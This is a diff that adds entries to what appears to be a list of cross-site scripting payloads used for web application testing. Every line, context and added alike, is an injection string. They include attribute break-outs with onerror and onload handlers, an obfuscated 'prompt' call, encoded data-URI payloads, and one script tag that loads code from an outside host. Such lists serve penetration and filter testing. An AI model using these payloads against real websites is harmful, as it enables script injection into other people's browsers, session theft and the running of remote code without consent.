@@ -41,3 +41,12 @@ perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
 <iframe/src \/\/onload = prompt(1)
 <x oncut=alert()>x
 <svg onload=write()>
+";a=prompt,a()//
+"><iframe%20src="http://google.com"%%203E
+"><img src=1 onerror=alert(1)>.gif
+"><img src=x onerror=prompt(1);>
+"><img src=x onerror=window.open('https://www.google.com/');>
+"><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
+"><script src=//brutelogic.com.br&sol;1.js&num; 
+"><script src=data:&comma;alert(1)//
+"><svg onload=alert(1)//
